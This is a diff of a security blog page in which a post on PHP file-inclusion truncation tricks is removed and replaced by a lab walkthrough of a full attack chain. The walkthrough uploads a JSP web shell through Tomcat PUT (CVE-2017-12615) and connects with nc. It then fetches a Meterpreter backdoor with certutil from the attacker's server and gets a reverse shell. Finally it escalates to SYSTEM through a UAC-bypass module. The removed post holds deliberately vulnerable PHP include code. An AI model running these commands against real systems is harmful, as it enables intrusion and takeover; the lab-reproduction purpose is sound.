@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件包含漏洞-文件包含截断, Sheng &#39;s blog">
+    <meta name="keywords" content="windows内核提权尝试, Sheng &#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件包含漏洞-文件包含截断 | Sheng &#39;s blog</title>
+    <title>windows内核提权尝试 | Sheng &#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件包含漏洞-文件包含截断</h1>
+                    <h1 class="description center-align post-title">windows内核提权尝试</h1>
                 </div>
             </div>
         </div>
@@ -431,12 +431,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                                <span class="chip bg-color">文件包含</span>
+                            <a href="/tags/%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">复现</span>
                             </a>
                         
-                            <a href="/tags/Web/">
-                                <span class="chip bg-color">Web</span>
+                            <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                <span class="chip bg-color">提权</span>
                             </a>
                         
                     </div>
@@ -451,7 +451,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-05
+                    2021-05-06
                 </div>
                 
 
@@ -472,57 +472,93 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h1><h2 id="利用-00截断"><a href="#利用-00截断" class="headerlink" title="利用%00截断"></a>利用<code>%00</code>截断</h2><p><code>%00</code>截断受限于<code>GPC</code>和<code>addslashes()</code>等函数。也就是说<strong>在开启GPC或者使用过滤函数过滤的情况下不能使用</strong>，在<strong>PHP 5.3</strong>之后的版本全面修复了文件名<code>%00</code>截断的问题。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505100907925.png" alt="image-20210505100907925"></p>
+                <h1 id="windows内核提权实战"><a href="#windows内核提权实战" class="headerlink" title="windows内核提权实战"></a>windows内核提权实战</h1><p>kali IP:  172.16.10.111</p>
+<p>靶机IP: 172.16.10.180</p>
 <blockquote>
-<p>当url参数被过滤时</p>
-<p><code>%00</code>被转义成了0<code>    </code>0两个单体字符，不再具有截断功能</p>
+<p>2021-05-06自搭环境，漏洞为Tomcat PUT （cve-2017-12615）</p>
+<p>msf使用<code>tomcat_jsp_upload_bypass</code>模块</p>
 </blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505101258523.png" alt="image-20210505101258523"></p>
-<h2 id="利用-截断"><a href="#利用-截断" class="headerlink" title="利用./截断"></a>利用<code>./</code>截断</h2><p>利用多个<code>./</code>来截断，这种方式不受限于<code>GPC</code>，但是同样在PHP 5.3版本之后被修复。</p>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="对Web应用漏洞扫描探测"><a href="#对Web应用漏洞扫描探测" class="headerlink" title="对Web应用漏洞扫描探测"></a>对Web应用漏洞扫描探测</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212208824.png" alt="image-20210506212208824"></p>
 <blockquote>
-<p>在windows下使用240个点(<code>.</code>)连接可以截断</p>
+<p>发现服务的HTTP method方法中允许PUT，DELETE，允许客户端保存文件至服务器上</p>
 </blockquote>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
+<h3 id="生成jsp反弹木马"><a href="#生成jsp反弹木马" class="headerlink" title="生成jsp反弹木马"></a>生成jsp反弹木马</h3><pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfconsole 
+msf6 > use payload/windows/shell_bind_tcp
+msf6 payload(windows/shell_bind_tcp) > set lport 4449
+msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp
+[*] Writing 149075 bytes to shell.jsp...
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505104813141.png" alt="image-20210505104813141"></p>
+<h3 id="上传jsp木马"><a href="#上传jsp木马" class="headerlink" title="上传jsp木马"></a>上传jsp木马</h3><blockquote>
+<p>使用curl，通过PUT方式上传<code>/test.jsp/</code>文件</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212432604.png" alt="image-20210506212432604"></p>
+<h3 id="访问Web木马"><a href="#访问Web木马" class="headerlink" title="访问Web木马"></a>访问Web木马</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213004651.png" alt="image-20210506213004651"></p>
+<h3 id="使用nc连接"><a href="#使用nc连接" class="headerlink" title="使用nc连接"></a>使用nc连接</h3><pre class=" language-shell"><code class="language-shell">nc 172.16.10.180 4449
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213049337.png" alt="image-20210506213049337"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
+<p>在C盘下创建back目录</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">chcp 437        //将编码改为英文，不会出现乱码
+cd c:\
+mkdir back
+cd c:\back
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213421968.png" alt="image-20210506213421968"></p>
 <blockquote>
-<p>在windows下，<code>./</code>共240个能够截断。</p>
+<p>上传backdoor.exe后门</p>
 </blockquote>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'./'</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
+<pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfpc windows 172.16.10.111
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505105544640.png" alt="image-20210505105544640"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213546472.png" alt="image-20210506213546472"></p>
 <blockquote>
-<p>linux下需要2038个<code>./</code>组合才能截断。</p>
+<p>python快速开启http服务</p>
 </blockquote>
-<h2 id="利用-伪截断"><a href="#利用-伪截断" class="headerlink" title="利用?伪截断"></a>利用<code>?</code>伪截断</h2><p>远程包含时利用问号<code>?</code>来截断，不受GPC和PHP版本的影响，只要能够返回代码给包含函数，它就能执行。</p>
-<p>在HTTP协议中，访问<code>http://remotehost/1.txt</code>和访问<code>httpL://remotehost/1.txt?.php</code>的返回结果是一样的，因为这时候WebServer把<code>?</code>之后的内容当作是请求参数，而<code>txt</code>不在WebServer里面解析，参数对访问<code>1.txt</code>返回的内容不影响，于是就实现了伪截断。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
+<pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8180</span>
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505110633801.png" alt="image-20210505110633801"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213906822.png" alt="image-20210506213906822"></p>
+<blockquote>
+<p>靶机远程下载<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-cmd"><code class="language-cmd">certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214012023.png" alt="image-20210506214012023"></p>
+<blockquote>
+<p>kali开启监听</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">──(root💀kali)-[/home/sheng]
+└─# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214303446.png" alt="image-20210506214303446"></p>
+<blockquote>
+<p>靶机执行<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">c:\back>backdoor.exe
+backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214355334.png" alt="image-20210506214355334"></p>
+<blockquote>
+<p>得到shell</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214422916.png" alt="image-20210506214422916"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
+<p>使用msf中<code>post/multi/recon/local_exploit_suggester</code>模块查看可利用的提权模块</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214605716.png" alt="image-20210506214605716"></p>
+<blockquote>
+<p>使用<code>exploit/windows/local/bypassuac_eventvwr</code>模块进行提权</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214731844.png" alt="image-20210506214731844"></p>
+<p><strong>得到system权限，提权成功</strong></p>
 
                 
             </div>
@@ -549,7 +585,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://ms12020.github.io/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/">https://ms12020.github.io/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/</a>
+                    <a href="https://ms12020.github.io/2021/05/06/Windows%E6%8F%90%E6%9D%83%E5%B0%9D%E8%AF%95/">https://ms12020.github.io/2021/05/06/Windows%E6%8F%90%E6%9D%83%E5%B0%9D%E8%AF%95/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -587,12 +623,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                                    <span class="chip bg-color">文件包含</span>
+                                <a href="/tags/%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">复现</span>
                                 </a>
                             
-                                <a href="/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
+                                <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                    <span class="chip bg-color">提权</span>
                                 </a>
                             
                         </div>
@@ -638,9 +674,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/05/06/Windows%E6%8F%90%E6%9D%83%E5%B0%9D%E8%AF%95/">
                     <div class="card-image">
@@ -658,9 +695,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -669,6 +706,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -691,13 +729,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+                <a href="/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="CVE-2017-8464(快捷方式远程代码执行)漏洞复现">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="文件包含漏洞-文件包含截断">
                         
-                        <span class="card-title">CVE-2017-8464(快捷方式远程代码执行)漏洞复现</span>
+                        <span class="card-title">文件包含漏洞-文件包含截断</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -708,7 +746,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-05
                             </span>
                         <span class="publish-author">
                             
@@ -721,12 +759,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%A4%8D%E7%8E%B0/">
-                        <span class="chip bg-color">复现</span>
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                        <span class="chip bg-color">文件包含</span>
                     </a>
                     
-                    <a href="/tags/LNK/">
-                        <span class="chip bg-color">LNK</span>
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
                 </div>
